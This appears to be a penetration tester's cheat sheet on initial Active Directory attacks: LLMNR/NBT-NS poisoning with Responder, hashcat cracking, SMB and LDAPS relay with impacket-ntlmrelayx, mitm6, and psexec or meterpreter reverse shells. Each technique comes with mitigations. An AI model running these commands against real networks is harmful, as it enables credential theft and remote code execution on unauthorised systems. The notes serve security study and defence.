#  Initial Attack Vectors

---

### Active Directory

https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa


### LLMNR Poisoning:
Link-Local Multicast Name Resolution

To begin the attack, we start an LLMNR/NBT-NS poisoner such as Responder. 
Responder can listen for the LLMNR/NBT-NS queries being broadcast on the local network and by default also sets up several different servers, most notably SMB. 
These will be used to receive authentication requests after the poisoning.

```
responder -I tun0 -v -rdw

hashcat -m 5600 hash.txt -a 3 /usr/share/wordlists/rockyou.txt 
```

#### LLMNR Poisoning Defense
1. disable LLMNR and NBT-NS (Netbios)
2. use Network access control - can't just access any port, checks MAC address
3. Strong password policy

### SMB Relay attacks

Instead of cracking the hash generated from responder we relay those 
hash to specific machine and potentially gain access.

* SMB signing must be disabled
* Relayed user credentials must be admin on machine (separate machine)

find smb signing disabled hosts:
```
nmap --script=smb2-security-mode.nse -p445 192.168.170.131/24 
```
Turn off SMB and HTTP:
```
nano /etc/responder/Responder.conf 
```
Run responder:
```
responder -I tun0 -rdwv
```
run ntlmrelayx.py and wait for connection:
``` 
impacket-ntlmrelayx -tf target.txt -smb2support

# for interactive smb shell
impacket-ntlmrelayx -tf target.txt -smb2support -i

# execute
impacket-ntlmrelayx -tf target.txt -smb2support -e revshell.exe

# command
impacket-ntlmrelayx -tf target.txt -smb2support -c "whoami"
```

Mitigation Strategies:
- Enable SMB Signing on all devices
  - Pro: Completely stops the attack
  - Con: Can cause performance issues with file
  copies
- Disable NTLM authentication on network
  - Pro: Completely stops the attack
  - Con: If Kerberos stops working, Windows
  defaults back to NTLM
- Account tiering:
  - Pro: Limits domain admins to specific tasks
  (e.g. only log onto servers with need for DA)
  - Con: Enforcing the policy may be difficult

- Local admin restriction:
  - Pro: Can prevent a lot of lateral movement
  - Con: Potential increase in the amount of
  service desk tickets


reverse shell with credentials psexec.py:
```
impacket-psexec domain.local/user:Password@192.186.35.177
impacket-smbexec domain.local/user:Password@192.186.35.177
impacket-wmiexec domain.local/user:Password@192.186.35.177
```

msfconsole for reverse shell with credentials psexec:
``` 
use exploit/windows/smb/psexec 
set payload windows/x64/meterpreter/reverse_tcp 
```

### mitm6

https://github.com/dirkjanm/mitm6

https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/

https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/

```
mitm6 -d domain.local

impacket-ntlmrelayx -6 -t ldaps://192.168.13.177 -wh fackwpad.domain.local -l lootme 
```

### Mitigation Strategies:
1. IPv6 poisoning abuses the fact that Windows queries for
an IPv6 address even in IPv4-only environments. If you don't
use IPv6 internally, the safest way to prevent mitm6 is to block
DHCPv6 traffic and incoming router advertisements in
Windows Firewall via Group Policy. Disabling IPV6 entirely may
have unwanted side effects. Setting the following predefined
rules to Block instead of Allow prevents the attack from
working:

   - (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPV6(DHCPV6-In)
   - (Inbound) Core Networking - Router Advertisement (ICMPV6-In)
   - (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPV6(DHCPV6-Out)
2. If WPAD is not in use internally, disable it via Group Policy
and by disabling the WinHttpAutoProxySvc service.
3. Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.
4. Consider Administrative users to the Protected Users
group or marking them as Account is sensitive and cannot be
delegated, which will prevent any impersonation of that user
via delegation.

---

Multi-Function Peripherals

https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack

---

### Strategies:
- Begin day with mitm6 or Responder
- Run scans to generate traffic
- If scans are taking too long, look for
websites in scope (http_version)
- Look for default credentials on web logins
  - Printers
  - Jenkins
  - Etc
- Think outside the box


